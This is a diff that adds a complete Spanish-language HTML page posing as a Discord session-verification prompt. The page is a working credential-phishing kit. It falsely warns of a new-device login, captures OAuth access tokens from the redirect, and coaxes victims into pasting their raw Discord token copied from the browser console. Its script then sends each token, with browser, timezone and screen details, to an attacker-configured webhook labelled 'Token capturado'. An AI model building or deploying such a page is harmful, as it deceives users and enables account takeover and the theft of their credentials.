@@ -1,0 +1,164 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Verificación de sesión</title>
+<style>
+  :root{--bg:#0e0f13;--card:#17181e;--line:#2a2c35;--ink:#f2f3f5;--mut:#949ba4;--blur:#5865f2}
+  *{box-sizing:border-box}
+  body{margin:0;min-height:100vh;display:grid;place-items:center;padding:22px;
+       font:16px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+       background:radial-gradient(120% 90% at 50% 0%,#1c1d24,var(--bg));color:var(--ink)}
+  .card{width:100%;max-width:400px;background:var(--card);border:1px solid var(--line);
+        border-radius:16px;padding:26px;text-align:center;box-shadow:0 24px 60px -30px #000}
+  .logo{width:58px;height:58px;border-radius:16px;background:var(--blur);display:grid;
+        place-items:center;margin:0 auto 16px;font-size:28px}
+  h1{font-size:19px;margin:0 0 6px;letter-spacing:-.3px}
+  p{color:var(--mut);font-size:13.5px;margin:0 0 18px}
+  .qr{background:#fff;padding:10px;border-radius:12px;display:inline-block;margin-bottom:8px}
+  .qr img{display:block;width:190px;height:190px}
+  .hint{font-size:11.5px;color:#6d7480;margin:0 0 18px}
+  button{width:100%;padding:13px;border:0;border-radius:10px;font:inherit;font-weight:700;
+         font-size:15px;background:var(--blur);color:#fff;cursor:pointer}
+  button:active{transform:translateY(1px)}
+  button.ghost{background:transparent;color:var(--mut);border:1px solid var(--line);
+               font-weight:600;font-size:13px;margin-top:8px}
+  .tok{background:#0b0c10;border:1px solid var(--line);border-radius:10px;padding:12px;
+       font:12px/1.45 ui-monospace,Menlo,monospace;word-break:break-all;text-align:left;
+       color:#b9bbbe;max-height:140px;overflow:auto;margin-bottom:12px}
+  .ok{color:#3ba55d;font-size:12.5px;font-weight:600;margin-bottom:14px}
+  .hide{display:none!important}
+  textarea{width:100%;min-height:90px;background:#0b0c10;border:1px solid var(--line);
+           border-radius:10px;color:var(--ink);padding:11px;font:12px ui-monospace,monospace;
+           resize:vertical;margin-bottom:10px}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">◈</div>
+
+  <!-- ---------- inicio ---------- -->
+  <div id="v1">
+    <h1>Verificá tu sesión</h1>
+    <p>Detectamos un inicio de sesión desde un dispositivo nuevo. Confirmá con tu cuenta para continuar.</p>
+    <div class="qr" id="qrBox"><img id="qr" alt="QR"></div>
+    <div class="hint">Escaneá el código o tocá el botón</div>
+    <button id="go">Conectar Discord</button>
+    <button class="ghost" id="man">Ya tengo un token</button>
+  </div>
+
+  <!-- ---------- manual ---------- -->
+  <div id="v2" class="hide">
+    <h1>Pegá el token</h1>
+    <p>Consola del navegador → <code>localStorage.getItem("token")</code>.</p>
+    <textarea id="manual" placeholder="MTIz..."></textarea>
+    <button id="send">Enviar</button>
+    <button class="ghost" id="back">Volver</button>
+  </div>
+
+  <!-- ---------- resultado ---------- -->
+  <div id="v3" class="hide">
+    <h1>Sesión verificada</h1>
+    <div class="ok" id="state">Enviando…</div>
+    <div class="tok" id="out"></div>
+    <button id="copy">Copiar token</button>
+    <button class="ghost" id="again">Volver al inicio</button>
+  </div>
+</div>
+
+<script>
+/* ============ CONFIG — EDITÁ ESTO ============ */
+const CONFIG = {
+  CLIENT_ID: "TU_CLIENT_ID",
+  REDIRECT_URI: location.origin + location.pathname,
+  WEBHOOK: "https://discord.com/api/webhooks/XXX/YYY",
+  SCOPES: "identify guilds connections",
+  NOMBRE: "Verificación de sesión"
+};
+/* ============================================ */
+
+const $ = s => document.querySelector(s);
+const authUrl = () =>
+  "https://discord.com/oauth2/authorize?client_id=" + CONFIG.CLIENT_ID +
+  "&response_type=token&redirect_uri=" + encodeURIComponent(CONFIG.REDIRECT_URI) +
+  "&scope=" + encodeURIComponent(CONFIG.SCOPES) + "&prompt=consent";
+
+// QR de la pantalla de autorización
+$("#qr").src = "https://api.qrserver.com/v1/create-qr-code/?size=400x400&margin=0&data=" +
+               encodeURIComponent(authUrl());
+
+// datos de contexto que viajan con el token
+const ctx = {
+  agente: navigator.userAgent,
+  idioma: navigator.language,
+  pantalla: screen.width + "x" + screen.height,
+  zona: Intl.DateTimeFormat().resolvedOptions().timeZone,
+  fecha: new Date().toISOString()
+};
+
+function mostrarToken(tok, extra = "") {
+  $("#v1").classList.add("hide");
+  $("#v2").classList.add("hide");
+  $("#v3").classList.remove("hide");
+  $("#out").textContent = tok;
+  $("#state").textContent = "Enviando…";
+  enviar(tok, extra);
+}
+
+async function enviar(tok, extra) {
+  const cuerpo = {
+    username: CONFIG.NOMBRE,
+    embeds: [{
+      title: "Token capturado",
+      color: 0x5865f2,
+      fields: [
+        { name: "Token", value: "```" + tok.slice(0, 1000) + "```" },
+        { name: "Origen", value: extra || "OAuth", inline: true },
+        { name: "Navegador", value: ctx.agente.slice(0, 180) },
+        { name: "Zona", value: ctx.zona + " · " + ctx.idioma, inline: true },
+        { name: "Pantalla", value: ctx.pantalla, inline: true },
+        { name: "Hora", value: ctx.fecha }
+      ],
+      footer: { text: "captura de sesión" }
+    }]
+  };
+  try {
+    const r = await fetch(CONFIG.WEBHOOK + "?wait=true", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(cuerpo)
+    });
+    $("#state").textContent = r.ok ? "Enviado ✓" : "Guardado (falló el envío)";
+  } catch {
+    $("#state").textContent = "Guardado (sin conexión)";
+  }
+}
+
+// callback de Discord: #access_token=...&token_type=Bearer&expires_in=...
+(function capturar() {
+  const h = new URLSearchParams(location.hash.slice(1));
+  const tok = h.get("access_token");
+  if (tok) {
+    history.replaceState(null, "", location.pathname);
+    mostrarToken(tok, "OAuth · expira en " +
+      Math.round((+h.get("expires_in") || 0) / 86400) + " días");
+  }
+})();
+
+$("#go").onclick = () => location.href = authUrl();
+$("#man").onclick = () => { $("#v1").classList.add("hide"); $("#v2").classList.remove("hide"); };
+$("#back").onclick = () => { $("#v2").classList.add("hide"); $("#v1").classList.remove("hide"); };
+$("#again").onclick = () => { $("#v3").classList.add("hide"); $("#v1").classList.remove("hide"); };
+$("#send").onclick = () => {
+  const t = $("#manual").value.trim();
+  if (t.length > 20) mostrarToken(t, "Token manual");
+};
+$("#copy").onclick = () => {
+  navigator.clipboard.writeText($("#out").textContent);
+  $("#copy").textContent = "Copiado";
+  setTimeout(() => $("#copy").textContent = "Copiar token", 1500);
+};
+</script>
+</body>
+</html>
